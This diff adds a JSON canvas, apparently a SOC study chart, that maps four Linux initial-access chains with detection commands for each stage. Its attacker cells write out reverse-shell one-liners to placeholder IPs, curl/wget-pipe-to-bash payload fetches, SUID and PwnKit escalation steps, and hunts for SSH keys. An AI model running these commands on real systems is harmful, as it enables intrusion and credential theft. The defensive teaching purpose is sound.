@@ -1,0 +1,1131 @@
+{
+  "nodes": [
+    {
+      "id": "506536d2823e447a",
+      "type": "text",
+      "x": 0,
+      "y": -582,
+      "width": 3290,
+      "height": 422,
+      "text": "# 🐧 Linux Attack Chains by Initial Access Technique\nThe way the attacker gets in **decides the whole chain**: who is driving, what Discovery looks like, whether a reverse shell or privilege escalation is needed, and how they stay. Read each column top → bottom, then compare across.\n\n**Every stage has three parts**\n- 🔴 **Attacker** — what they do (top)\n- 🔵 **Detect** — logs, exact `grep` / `ausearch` commands and what to look for (middle)\n- 🟡 **Don't waste time on** — noisy or unreliable sources, tempting dead ends and blind spots (bottom)\n\n**Top 3 log sources:** `auth.log` (`/var/log/secure` on RHEL) · app logs · runtime logs (auditd). Most Linux Initial Access ends up as **process-tree analysis**: find the suspicious command, walk **up** to its parent, list **down** to its children.\n\n🔶 = pattern inferred from the source's logic, not stated verbatim · † = ATT&CK ID added by me, not in your source notes\nNot charted: SSH session hijacking (T1563.001) and the Erlang/OTP SSH CVE — the source only names them as advanced topics.",
+      "color": "6"
+    },
+    {
+      "id": "9def8298ebb447cd",
+      "type": "group",
+      "x": 310,
+      "y": -40,
+      "width": 720,
+      "height": 9238,
+      "label": "🔑 Chain A — Exposed SSH (T1133)"
+    },
+    {
+      "id": "21bce4108685496f",
+      "type": "group",
+      "x": 1070,
+      "y": -40,
+      "width": 720,
+      "height": 9238,
+      "label": "🌐 Chain B — Exposed service / web app (T1190)"
+    },
+    {
+      "id": "5068f441da0042e6",
+      "type": "group",
+      "x": 1830,
+      "y": -40,
+      "width": 720,
+      "height": 9238,
+      "label": "🧑‍💻 Chain C — Human-led: the admin runs it (T1204†)"
+    },
+    {
+      "id": "e774053c840248c6",
+      "type": "group",
+      "x": 2590,
+      "y": -40,
+      "width": 720,
+      "height": 9238,
+      "label": "📦 Chain D — Supply chain compromise (T1195)"
+    },
+    {
+      "id": "ef4bec41a59f4f11",
+      "type": "text",
+      "x": 0,
+      "y": 0,
+      "width": 250,
+      "height": 380,
+      "text": "## 👁️ At a glance\nWhat makes each chain unique",
+      "color": "6"
+    },
+    {
+      "id": "1e0f679b2db34976",
+      "type": "text",
+      "x": 0,
+      "y": 490,
+      "width": 250,
+      "height": 1539,
+      "text": "## 1 · Initial Access\nTA0001",
+      "color": "6"
+    },
+    {
+      "id": "a8800a7301fa4ccc",
+      "type": "text",
+      "x": 0,
+      "y": 2139,
+      "width": 250,
+      "height": 1392,
+      "text": "## 2 · First actions\nDiscovery TA0007",
+      "color": "6"
+    },
+    {
+      "id": "77143a832b4146ba",
+      "type": "text",
+      "x": 0,
+      "y": 3641,
+      "width": 250,
+      "height": 1338,
+      "text": "## 3 · Tools & control\nIngress Tool Transfer T1105 · reverse shell",
+      "color": "6"
+    },
+    {
+      "id": "f66224d83cb94d0a",
+      "type": "text",
+      "x": 0,
+      "y": 5089,
+      "width": 250,
+      "height": 1197,
+      "text": "## 4 · Privilege Escalation\nTA0004",
+      "color": "6"
+    },
+    {
+      "id": "274a2bb0237041e1",
+      "type": "text",
+      "x": 0,
+      "y": 6396,
+      "width": 250,
+      "height": 1619,
+      "text": "## 5 · Persistence\nTA0003",
+      "color": "6"
+    },
+    {
+      "id": "ea9372b133614ee5",
+      "type": "text",
+      "x": 0,
+      "y": 8125,
+      "width": 250,
+      "height": 1033,
+      "text": "## 6 · Goal & Impact\nTA0040",
+      "color": "6"
+    },
+    {
+      "id": "7527ef42430d4206",
+      "type": "text",
+      "x": 330,
+      "y": 0,
+      "width": 680,
+      "height": 380,
+      "text": "### 🔑 Exposed SSH\n**T1133** External Remote Services\n- **Driver:** a botnet gets in; a human joins once the entry point is ready\n- **How in:** weak or guessed password, or a stolen private key\n- **First sign:** `Failed password` flood, then `Accepted password` from an external IP\n- **Process tree:** `sshd` → `bash` (interactive login, real `auid`)\n- **Signature move:** discovery burst → tools by SCP → miner / botnet; backdoor via SSH key or new user",
+      "color": "6"
+    },
+    {
+      "id": "c2a9889bb36046c5",
+      "type": "text",
+      "x": 1090,
+      "y": 0,
+      "width": 680,
+      "height": 380,
+      "text": "### 🌐 Exposed service / web app\n**T1190** Exploit Public-Facing Application\n- **Driver:** exploit → limited shell → human operator\n- **How in:** command injection, CVEs (Zimbra, Palo Alto), exposed Docker API, WordPress plugin upload\n- **First sign:** `;whoami` in web logs, or the service itself spawning `whoami`\n- **Process tree:** web app → `sh -c` → commands, `auid=unset`\n- **Signature move:** reverse shell → privilege escalation → web shell persistence",
+      "color": "6"
+    },
+    {
+      "id": "4f14a8dc084140bf",
+      "type": "text",
+      "x": 1850,
+      "y": 0,
+      "width": 680,
+      "height": 380,
+      "text": "### 🧑‍💻 Human-led\n**T1204†** User Execution\n- **Driver:** a technical person runs something untrusted\n- **How in:** `curl https://shadyforum.thm/fix.sh | bash`, or a typo-squatted `pip3 install fastpi`\n- **First sign:** an install / download in the admin's own session, then processes it should never spawn\n- **Process tree:** admin's SSH or terminal session → `curl` / `pip3` → payload\n- **Signature move:** the admin silently infects their own server",
+      "color": "6"
+    },
+    {
+      "id": "99cc0d7c783a4bad",
+      "type": "text",
+      "x": 2610,
+      "y": 0,
+      "width": 680,
+      "height": 380,
+      "text": "### 📦 Supply chain\n**T1195** Supply Chain Compromise\n- **Driver:** a trusted update, dependency or CI action turns hostile\n- **How in:** XZ Utils backdoor (a library in SSH), tj-actions leaking SSH keys and tokens\n- **First sign:** a trusted internal service suddenly runs `wget` or a shell\n- **Process tree:** internal service → `wget` / `curl` / `sh`\n- **Signature move:** the attack arrives from software you already trust, anywhere, anytime",
+      "color": "6"
+    },
+    {
+      "id": "0617519eda27457a",
+      "type": "text",
+      "x": 330,
+      "y": 490,
+      "width": 680,
+      "height": 408,
+      "text": "### 1️⃣ Brute force / stolen key / weak password\n🔴 **Attacker**\n- Botnets scan the Internet for exposed SSH (Shodan: 40M+ hosts) and guess the password or use a stolen private key\n- **Key risks:** keys leaked in GitHub or Ansible servers, or stolen from an admin laptop by a data stealer\n- **Password risks:** a weak test password never reverted, a contractor with `12345678`, a forgotten old SSH server on the Internet\n- **Dota3 example:** 2000+ IPs in 94 countries brute-force mostly `root` with the top 1000 passwords; once guessed, one botnet host logs in and continues\n- Real groups: Outlaw (SSH brute force)",
+      "color": "1"
+    },
+    {
+      "id": "e7658cd0b28b445f",
+      "type": "text",
+      "x": 330,
+      "y": 924,
+      "width": 680,
+      "height": 677,
+      "text": "### 🔵 Detect — auth.log (`/var/log/secure` on RHEL)\n**Start with the successes, not the failures**\n```bash\ngrep sshd /var/log/auth.log | grep Accepted\n```\nFormat: `<result> <auth-method> for <user> from <ip> port <p> ssh2`\n\n**Three red flags on an `Accepted` line**\n1. **Password** authentication instead of a key\n2. **External** source IP\n3. **Odd time** for that user (e.g. 03:14)\n\n**Then confirm**\n- **Username:** who owns it — is this time and IP expected?\n- **Source IP:** threat-intel lookup and asset lookup — trusted or malicious?\n- **Login history:** was there a `Failed password` run before the success?\n- **Next step:** follow what the session did (auditd)\n\n**Benign look-alike:** `Accepted publickey for ansible` from an internal IP at exactly 14:00 = periodic automation — still verify the IP really is the Ansible server.\n\nAlso useful: `grep -E 'session opened|session closed' /var/log/auth.log`",
+      "color": "5"
+    },
+    {
+      "id": "e1ff9c10a6694685",
+      "type": "text",
+      "x": 330,
+      "y": 1627,
+      "width": 680,
+      "height": 402,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Counting every `Failed password`** — brute force is background noise on any exposed SSH; the success line is what matters\n- ⛔ **`~/.bash_history`** to prove the login — written only at logout and blind to scripted or non-interactive use\n- ⛔ **syslog / kern.log / dpkg.log** — wrong source for logins\n- ⚠️ 🔶 **Blind spot:** a stolen key gives a clean `Accepted publickey` with no brute force and no password flag — judge by IP, time and what the session does next\n- 🟢 No logon-type fields to learn: Linux SSH logs are far simpler than Windows 4624/4625",
+      "color": "3"
+    },
+    {
+      "id": "cb214568a5674a57",
+      "type": "text",
+      "x": 1090,
+      "y": 490,
+      "width": 680,
+      "height": 408,
+      "text": "### 1️⃣ Exploit the public-facing app\n🔴 **Attacker**\n- Any exposed app can open the whole host: web, mail, databases, IT/dev tools, Linux-based firewalls and VPNs\n- **Real cases:** Zimbra CVE (arbitrary OS commands) · exposed **Docker API** (cloud breaches) · Palo Alto CVE (full OS control) · **WordPress plugins** abused to upload web shells\n- **TryPingMe example:** the app runs `ping -c 2 <INPUT>` unfiltered → command injection via `/ping?host=;whoami`\n- Access starts as the **low-privilege service user** (e.g. `www-data`, `serviceuser`), sometimes confined to one folder",
+      "color": "1"
+    },
+    {
+      "id": "def7f3e13c564b6f",
+      "type": "text",
+      "x": 1090,
+      "y": 924,
+      "width": 680,
+      "height": 677,
+      "text": "### 🔵 Detect — two independent views\n**View 1 — web logs** (`/var/log/nginx/access.log`)\n- Linux commands inside query parameters: `host=;whoami`, `host=;ls`\n- **Status-code tell:** `host=whoami` → **500** (failed) vs `host=;whoami` → **200** (injection worked)\n- One client IP repeating this = likely attacker; the page = vulnerable; the OS is now at risk\n\n**View 2 — process tree (auditd), the universal method**\n```bash\nausearch -i -x whoami                        # the trigger\nausearch -i --pid <ppid>                     # walk UP until PID 1\nausearch -i --ppid <pid> | grep proctitle    # list ALL children\n```\nExpected chain: `python3 /opt/mywebapp/app.py` (`ppid=1`) → `/bin/sh -c whoami` → `whoami` with **`auid=unset`** and `tty=(none)` = no person logged in behind it\n\n**Hunt the worse siblings:** `ls -la`, `curl http://…-bot.thm | sh`",
+      "color": "5"
+    },
+    {
+      "id": "5cf17d60d99f450a",
+      "type": "text",
+      "x": 1090,
+      "y": 1627,
+      "width": 680,
+      "height": 402,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Waiting for the app to log \"I'm being exploited\"** — apps never do; web logs give artifacts, not the story\n- ⛔ **Debating \"is `whoami` normal app behavior?\" from logs alone** — list the app's *other* children; a `curl … | sh` ends the debate\n- ⛔ **Reading all web traffic** — hunt for shell metacharacters / commands in parameters and 500 → 200 flips\n- ⚠️ App logs may be missing or unhelpful — fall back to the process tree\n- 🎯 **High-value rule:** alert on **any `whoami` execution**. Legit apps rarely run it; attackers almost always run it first after breaching a service",
+      "color": "3"
+    },
+    {
+      "id": "eb8f192eb9a34dc9",
+      "type": "text",
+      "x": 1850,
+      "y": 490,
+      "width": 680,
+      "height": 408,
+      "text": "### 1️⃣ The admin runs it themselves\n🔴 **Attacker**\n- Linux is a server OS run by technical people, so classic phishing is rare — but humans still slip\n- **Script from a forum:** `curl https://shadyforum.thm/fix.sh | bash` — the script is never read and silently infects the server\n- **Typo-squatted package:** `pip3 install fastpi` (one letter off) — malware published on purpose by threat actors (real PyPI cases)",
+      "color": "1"
+    },
+    {
+      "id": "163d4ebc875941b7",
+      "type": "text",
+      "x": 1850,
+      "y": 924,
+      "width": 680,
+      "height": 677,
+      "text": "### 🔵 Detect — process tree from the admin's own session\n- **Trigger:** any alert from the payload's behavior (odd command, connection to a bad IP)\n- **Walk up the tree:** the chain should end at an **interactive login** (`auid` = a real user, `tty=pts/N`), not at a service\n- 🔶 **Find the install/download just before:**\n```bash\nausearch -i -x curl\nausearch -i | grep -E 'pip3? install'\n```\n- Then look at what the downloaded script / package spawned: shells, binaries in `/tmp`, outbound connections",
+      "color": "5"
+    },
+    {
+      "id": "24b3b0fa1b3345e2",
+      "type": "text",
+      "x": 1850,
+      "y": 1627,
+      "width": 680,
+      "height": 402,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **`~/.bash_history`** for \"what did the admin type?\" — a leading space, commands pasted into a script, or `sh` all dodge it\n- ⛔ **Hunting phishing emails or attachments** — not the vector on Linux servers\n- ⚠️ **Blind spot:** the account is legitimate, so `auth.log` looks 100% normal. Only runtime logs (auditd / EDR) show it\n- 🔶 Cheap first step: ask the admin what they ran and from where",
+      "color": "3"
+    },
+    {
+      "id": "84d09a51c70a4e3c",
+      "type": "text",
+      "x": 2610,
+      "y": 490,
+      "width": 680,
+      "height": 408,
+      "text": "### 1️⃣ A trusted dependency turns hostile\n🔴 **Attacker**\n- Breach the software first; every user then installs the malicious update (**T1195**)\n- A typical server has **hundreds of dependencies** from different maintainers — the attack can come from anywhere, anytime\n- **XZ Utils:** a backdoor in a library that is part of SSH nearly breached millions of Linux servers\n- **tj-actions:** the compromise leaked thousands of secrets such as SSH keys and access tokens",
+      "color": "1"
+    },
+    {
+      "id": "1a852a97702646f1",
+      "type": "text",
+      "x": 2610,
+      "y": 924,
+      "width": 680,
+      "height": 677,
+      "text": "### 🔵 Detect — a trusted service behaving badly\n- Same process-tree method; the tell is the **parent**: an **internal service** (not an admin, not the web app) running `wget` / `curl` / a shell\n```bash\nausearch -i -x wget\nausearch -i --pid <ppid>        # who is this internal service?\n```\n- 🔶 **Package logs date the change:** `/var/log/dpkg.log` (or `apt`) on Debian, `dnf.log` / `yum.log` on RHEL — read them *after* you have a suspect\n- 🔶 **Leaked secrets surface later** as `Accepted` logins from new IPs — check `auth.log`\n- Alerts on EDR/AV for a new malicious file or process also count",
+      "color": "5"
+    },
+    {
+      "id": "f882bb0ddc014a50",
+      "type": "text",
+      "x": 2610,
+      "y": 1627,
+      "width": 680,
+      "height": 402,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Hunting \"the malicious package\" first** — start from the *behavior* (service spawning `wget`), then trace back to the update\n- ⛔ **IOC-only thinking** — a fresh backdoor has no IOC yet; the process tree catches behavior\n- ⛔ **Package logs as a daily source** — noisy and rarely used in the daily SOC routine; DFIR tool\n- ⚠️ 🔶 **Blind spot:** because the software is trusted, nothing looks wrong in `auth.log` — only runtime logs show the odd child process",
+      "color": "3"
+    },
+    {
+      "id": "14d1d2d6d8d44fe0",
+      "type": "text",
+      "x": 330,
+      "y": 2139,
+      "width": 680,
+      "height": 530,
+      "text": "### 2️⃣ Botnet hands over to a human — scripted discovery\n🔴 **Attacker** — usually the same set whatever the entry point\n- **OS / filesystem:** `pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname`\n- **Users / groups:** `id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd`\n- **Process / network:** `ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp`\n- **Sandbox / security tools:** `systemd-detect-virt`, `lsmod`, `uptime`, `pgrep \"<edr-or-sandbox>\"`\n- **Miner fit (Dota3):** `cat /proc/cpuinfo`, `free -m`, `lscpu | grep Model`, plus `crontab -l`, `w`, `uname -m`\n- Skipped only when the target is already known, or when the goal is \"install a miner and exit\"\n- Discovery IDs: T1082† T1033† T1057† T1016† T1049†",
+      "color": "1"
+    },
+    {
+      "id": "3279c18b7a804647",
+      "type": "text",
+      "x": 330,
+      "y": 2695,
+      "width": 680,
+      "height": 468,
+      "text": "### 🔵 Detect — a burst of commands from one SSH session\n```bash\nausearch -i -x uname            # or lscpu, whoami, free, ...\nausearch -i --pid <ppid>        # parent should be bash inside an sshd session\n```\n- A **spike** of many discovery commands within seconds = scripted\n- **Miner tell:** `lscpu`, `/proc/cpuinfo`, `free -m` — almost no other malware needs CPU and RAM details\n- `auid=<user>` + `tty=pts/N` = interactive login; the same `auid` ties the burst back to the SSH `Accepted` line\n- Context decides: attacker vs legitimate service vs admin — get it with the process tree\n- Alerts at scale: spike of discovery commands, SSH login from a known-malicious IP",
+      "color": "5"
+    },
+    {
+      "id": "95a30289037740ad",
+      "type": "text",
+      "x": 330,
+      "y": 3189,
+      "width": 680,
+      "height": 342,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Judging single commands** — `id`, `ps`, `ip a` are what *you* would run; judge the **burst + origin + time**\n- ⛔ **Triage without process context** — a network monitoring tool legitimately `ping`s the local network; an admin may run `find`\n- ⛔ **Bash history for the burst** — scripted runs and `sh` sessions don't land in it\n- ⚠️ **Blind spot:** auditd logs nothing by default — if no rule covers these binaries you see nothing, so write the rules first",
+      "color": "3"
+    },
+    {
+      "id": "d43d4688c004401e",
+      "type": "text",
+      "x": 1090,
+      "y": 2139,
+      "width": 680,
+      "height": 530,
+      "text": "### 2️⃣ Blind shell — orient and fight the limits\n🔴 **Attacker**\n- Same first commands: `whoami`, `id; pwd; ls -la; crontab -l`, `uname -r`\n- **Security-tool discovery:** `ps aux | egrep \"edr|splunk|elastic\"`\n- **Specialized goals**\n  - secrets: `history | grep pass`, `find / -name .env`, `find /home -name id_rsa`\n  - network scan: `ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22; done`\n- **Web execution is clumsy:** buggy output, timeouts, rate limits, no Ctrl+C, network restrictions",
+      "color": "1"
+    },
+    {
+      "id": "74c2f671c3a640dc",
+      "type": "text",
+      "x": 1090,
+      "y": 2695,
+      "width": 680,
+      "height": 468,
+      "text": "### 🔵 Detect — discovery spawned by the web app\n- **Red flag:** a web server suddenly spawning `whoami` / `id` / `ls` / `find`\n```bash\nausearch -i -x whoami\nausearch -i --pid <ppid>                    # → /bin/sh -c whoami → python3 app.py\nausearch -i --ppid <app-pid> | grep proctitle\n```\n- `auid=unset` + `uid=<service user>` + `tty=(none)` = not a person at a keyboard\n- List the app's other children: `ls -la`, `find /home -name *secret*` — one of them settles it\n- Hunting for `edr|splunk|elastic` is a strong \"adversary checking defenses\" signal\n- Expect a **reverse shell next** (stage 3) because of the execution limits",
+      "color": "5"
+    },
+    {
+      "id": "b6eb98a945ab4e9a",
+      "type": "text",
+      "x": 1090,
+      "y": 3189,
+      "width": 680,
+      "height": 342,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Asking \"could this be app behavior?\" first** — build the tree and read *every* child\n- ⛔ **Alerting on each discovery command** — alert on the **pattern** (a burst) and the **parent** (a service)\n- ⛔ **Bash history** — web-spawned commands are non-interactive and never reach it\n- ⚠️ Not every unusual request is an exploit: confirm through the **child process**, not the URL alone",
+      "color": "3"
+    },
+    {
+      "id": "1c820abf54b14268",
+      "type": "text",
+      "x": 1850,
+      "y": 2139,
+      "width": 680,
+      "height": 530,
+      "text": "### 2️⃣ 🔶 Same commands, launched by the payload\n🔴 **Attacker**\n- The script or package immediately runs the standard discovery set, plus secrets hunting (`find / -name id_rsa`, `history | grep pass`), from the admin's session\n- Its goals depend on what was baked in: miner, botnet, data stealer",
+      "color": "1"
+    },
+    {
+      "id": "ac6fc7258a8140a9",
+      "type": "text",
+      "x": 1850,
+      "y": 2695,
+      "width": 680,
+      "height": 468,
+      "text": "### 🔵 Detect\n- Discovery commands whose **parent is the payload** (the downloaded script, or a `python` child of `pip3`) — not the admin's shell directly\n```bash\nausearch -i -x whoami\nausearch -i --pid <ppid>\n```\n- The admin's `auid` stays the same → the trail ties back to the human session\n- Compare with what the admin *meant* to do (fix a server issue, install fastapi): a hunt for private keys is out of scope for that task",
+      "color": "5"
+    },
+    {
+      "id": "39fccecbbdb0445f",
+      "type": "text",
+      "x": 1850,
+      "y": 3189,
+      "width": 680,
+      "height": 342,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Blaming the admin's own discovery habits** — judge the *parent*: a payload script is not the admin typing\n- ⛔ **Bash history** — a script's commands are not recorded there\n- ⚠️ The admin's `auid` can make everything look like normal admin activity; the **parent chain** exposes it",
+      "color": "3"
+    },
+    {
+      "id": "5381233bbd9b451f",
+      "type": "text",
+      "x": 2610,
+      "y": 2139,
+      "width": 680,
+      "height": 530,
+      "text": "### 2️⃣ 🔶 Same commands, launched by a trusted service\n🔴 **Attacker**\n- The compromised component runs the usual discovery set (`whoami`, `id`, `uname -a`, secrets hunting) under its own service account",
+      "color": "1"
+    },
+    {
+      "id": "820b98b113a74a49",
+      "type": "text",
+      "x": 2610,
+      "y": 2695,
+      "width": 680,
+      "height": 468,
+      "text": "### 🔵 Detect\n- Discovery with a parent that **never** runs discovery: an internal service, build agent or updater\n```bash\nausearch -i -x whoami\nausearch -i --pid <ppid>\n```\n- `auid=unset` again (no login session)\n- Priority: the **first** shell or discovery child that service ever spawned — it dates the compromise",
+      "color": "5"
+    },
+    {
+      "id": "d98e62246c4e4b52",
+      "type": "text",
+      "x": 2610,
+      "y": 3189,
+      "width": 680,
+      "height": 342,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Whitelisting a service because it is \"ours\"** — a trusted parent is exactly how supply-chain attacks hide\n- ⚠️ Rely on the parent/child relationship, not on the reputation of the service",
+      "color": "3"
+    },
+    {
+      "id": "2c2cf881916d47ea",
+      "type": "text",
+      "x": 330,
+      "y": 3641,
+      "width": 680,
+      "height": 383,
+      "text": "### 3️⃣ Upload tools over the access they already have\n🔴 **Attacker**\n- **Ingress Tool Transfer T1105:** `wget … -O /tmp/miner.tar.gz`, `curl --output … \"<url>\"`, `scp attacker@c2:/path /tmp/…`\n- **Dota3:** pushes `dota3.tar.gz` via **SCP**, unpacks it into a hidden `/tmp/.X26-unix/.rsync/c`\n  - `tsm` — a custom SSH scanner hunting other hosts in 192.168.* and 172.16.*\n  - `initall` — an XMRig cryptominer\n  - both started with **`nohup`** so they survive logout\n- No reverse shell needed — SSH is already a perfect terminal",
+      "color": "1"
+    },
+    {
+      "id": "c681d09af90e4eda",
+      "type": "text",
+      "x": 330,
+      "y": 4050,
+      "width": 680,
+      "height": 529,
+      "text": "### 🔵 Detect — depends on who starts the transfer\n**Victim pulls** (`scp attacker@c2:…`, `wget`, `curl`) → process creation in auditd\n```bash\nausearch -i -x scp\n```\n**Attacker pushes** (`scp ./malware.sh ubuntu@victim:/tmp`) → **no `scp` on the victim**; look for the **new SSH login** in `auth.log`\n\n**Also watch**\n- **Network:** downloads from IPs or domains seen in attacks, or from hosts like GitHub that serve attack tools\n- **Files:** new files in `/tmp` and `/var/tmp`; names like `exploit`, `shell.php`, `kF1pBsY5`; **hidden folders** (`/tmp/.X26-unix`); archives named like known malware (`dota3.tar.gz`)\n- **Commands:** `nohup`; **SSH port scans** of 192.168.* and 172.16.*\n- **EDR / AV:** the XMRig binary is blocked by most EDRs",
+      "color": "5"
+    },
+    {
+      "id": "c8016f42887941f5",
+      "type": "text",
+      "x": 330,
+      "y": 4605,
+      "width": 680,
+      "height": 374,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Searching the victim's auditd for `scp`** when the attacker pushed the file — it isn't there; open `auth.log`\n- ⛔ **Bash history** for `wget` / `curl` — only some appear, never from scripted or `sh` sessions\n- ⛔ **Trusting a folder because it looks legit** — `.X26-unix` is named like a system folder to discourage investigation\n- ⛔ **Reading all auditd output** — filter by key or executable (`-k`, `-x`); balanced rules beat more logs\n- ⚠️ The same push-vs-pull logic applies to FTP and SMB transfers",
+      "color": "3"
+    },
+    {
+      "id": "320f4fa8eb934f02",
+      "type": "text",
+      "x": 1090,
+      "y": 3641,
+      "width": 680,
+      "height": 383,
+      "text": "### 3️⃣ Reverse shell — the way out of the web limits\n🔴 **Attacker**\n- Web execution is clumsy, so the victim is made to **connect back** — often the only way to continue\n- `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`\n- `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane`\n- `python3 -c '[...] s.connect((\"10.30.30.30\",80));pty.spawn(\"bash\")'`\n- Tools then fetched with `wget` / `curl` (e.g. `curl --output /var/www/html/backdoor.php \"<url>\"`) or `scp`",
+      "color": "1"
+    },
+    {
+      "id": "99e06c28a79642e4",
+      "type": "text",
+      "x": 1090,
+      "y": 4050,
+      "width": 680,
+      "height": 529,
+      "text": "### 🔵 Detect — a reverse shell is a CRITICAL alert\n```bash\nausearch -i -x socat                              # or the bash / python3 variant\nausearch -i --pid <ppid>                          # /bin/sh -c \"… && socat TCP:…\"  →  main.py\nausearch -i --ppid <shell-pid> | grep proctitle   # everything typed in the shell\n```\n- Tree: `main.py` (web app, `ppid=1`) → `/bin/sh -c … socat …` → `socat` → shell → `id`, `uname -a`, `ls -la`\n- A **human is now actively at the keyboard** — treat it as a breach in progress\n- After the shell: discovery and the later stages — list them all through the shell's `--ppid`\n- Also: `wget` / `curl` downloads and new files in `/tmp` or `/var/www/html` (e.g. `backdoor.php`)",
+      "color": "5"
+    },
+    {
+      "id": "35eeff87ba0f4eb0",
+      "type": "text",
+      "x": 1090,
+      "y": 4605,
+      "width": 680,
+      "height": 374,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Debating severity** — reverse shells are critical by default\n- ⛔ **Looking for the shell in `auth.log`** — it is not a login; there is no SSH/PAM session\n- ⛔ **Bash history** — shell sessions started from a service aren't saved there\n- ⚠️ 🔶 **Blind spot:** a rule naming only `bash` or `socat` misses other methods (python, `/dev/tcp`). Hunt for an **outbound connection from a service-user process**, not for one tool name",
+      "color": "3"
+    },
+    {
+      "id": "84f96bd0e87e4329",
+      "type": "text",
+      "x": 1850,
+      "y": 3641,
+      "width": 680,
+      "height": 383,
+      "text": "### 3️⃣ 🔶 The payload fetches its next stage\n🔴 **Attacker**\n- `curl … | bash` already *is* the execution; the script then pulls further tools with `wget` / `curl`, or a malicious package calls home",
+      "color": "1"
+    },
+    {
+      "id": "4eddccc2401a4689",
+      "type": "text",
+      "x": 1850,
+      "y": 4050,
+      "width": 680,
+      "height": 529,
+      "text": "### 🔵 Detect\n- An outbound connection from `bash` / `python3` that started inside the admin's session, to a domain the admin never used\n```bash\nausearch -i -x wget\nausearch -i -x curl\n```\n- New files in `/tmp` and `/var/tmp`; EDR/AV alert on a dropped file\n- Walk back with `--pid` to confirm the admin's session is the root of the chain",
+      "color": "5"
+    },
+    {
+      "id": "6bf5700b87444205",
+      "type": "text",
+      "x": 1850,
+      "y": 4605,
+      "width": 680,
+      "height": 374,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **The \"fix\" the admin was trying to apply** — whatever it promised, judge the child processes it spawned\n- ⚠️ Apply the same push-vs-pull rule as Chain A if the payload later receives files over SSH",
+      "color": "3"
+    },
+    {
+      "id": "39604558c1094d56",
+      "type": "text",
+      "x": 2610,
+      "y": 3641,
+      "width": 680,
+      "height": 383,
+      "text": "### 3️⃣ 🔶 The trusted component phones home\n🔴 **Attacker**\n- The compromised service or action downloads its payload and pulls follow-up tools with `wget` / `curl` (e.g. from a public host or a lookalike domain)",
+      "color": "1"
+    },
+    {
+      "id": "384109a16aae4b42",
+      "type": "text",
+      "x": 2610,
+      "y": 4050,
+      "width": 680,
+      "height": 529,
+      "text": "### 🔵 Detect\n- **The signal from the source:** an internal service running `wget`\n- Check the destination: known-malicious IP or domain, or a public service known to host attack tools such as GitHub\n- New files in `/tmp` and `/var/tmp`; EDR/AV alerts\n```bash\nausearch -i -x wget\n```",
+      "color": "5"
+    },
+    {
+      "id": "ba4d80ce3d2c459f",
+      "type": "text",
+      "x": 2610,
+      "y": 4605,
+      "width": 680,
+      "height": 374,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Treating GitHub or other big hosts as automatically safe** — attackers use them to blend in\n- ⚠️ A trusted service downloading things is not new; a *new destination* or a *new child process* is",
+      "color": "3"
+    },
+    {
+      "id": "41c6bd785eaa4df7",
+      "type": "text",
+      "x": 330,
+      "y": 5089,
+      "width": 680,
+      "height": 408,
+      "text": "### 4️⃣ Usually not needed\n🔴 **Attacker**\n- Hack-and-forget SSH attacks **rarely use privilege escalation**: botnets target `root` directly or a user that already has `sudo`\n- A breached limited user can use `sudo su` and sudo-run commands as the shortcut",
+      "color": "1"
+    },
+    {
+      "id": "8c6f42657bb54e40",
+      "type": "text",
+      "x": 330,
+      "y": 5523,
+      "width": 680,
+      "height": 421,
+      "text": "### 🔵 Detect — sudo leaves clear traces in auth.log\n```bash\ngrep -E 'COMMAND=' /var/log/auth.log\ngrep -E 'session opened' /var/log/auth.log | grep sudo\n```\n- `sudo: ubuntu : TTY=pts/0 ; … COMMAND=/usr/bin/systemctl stop edr` → **security tool stopped**\n- `COMMAND=/usr/bin/ufw status numbered` → firewall recon\n- `COMMAND=/usr/bin/su` and `pam_unix(sudo:session): session opened for user root by carol(uid=1003)` → **`sudo su` to root**\n- auditd: `auid` = the original login, `uid` = who ran it — **they differ after sudo / su**",
+      "color": "5"
+    },
+    {
+      "id": "adf0318a396b4175",
+      "type": "text",
+      "x": 330,
+      "y": 5970,
+      "width": 680,
+      "height": 316,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Hunting the exact exploit** — there are hundreds of SUID misconfigurations and thousands of vulnerabilities\n- ✅ Compare **`auid` vs `uid`** and read the commands *around* the escalation instead\n- ⚠️ A `sudo` login by an admin is normal; flag `systemctl stop <edr>` and disabled security tools, not sudo itself",
+      "color": "3"
+    },
+    {
+      "id": "8e5e80ab6a0c4863",
+      "type": "text",
+      "x": 1090,
+      "y": 5089,
+      "width": 680,
+      "height": 408,
+      "text": "### 4️⃣ Low-privilege service user → root\n🔴 **Attacker** — IF discovery shows … THEN:\n- `uname -a` shows an old, unpatched Ubuntu 16.04 → **PwnKit:** `wget http://bad.thm/pwnkit.sh | bash`\n- `find /bin -perm 4000` finds an `env` binary with **SUID** → `/bin/env /bin/bash -p`\n- `ls /etc/ssh` exposes an unprotected `ssh-backup-key` → `ssh root@127.0.0.1 -i ssh-backup-key`\n- **Typical sequence:** `wget …/pwnkit.c -O /tmp/pwnkit.c` → `gcc` → `chmod +x` → run `/tmp/pwnkit`\n- IDs: T1068† (exploit) · T1548.001† (SUID)",
+      "color": "1"
+    },
+    {
+      "id": "74750c1a6b424527",
+      "type": "text",
+      "x": 1090,
+      "y": 5523,
+      "width": 680,
+      "height": 421,
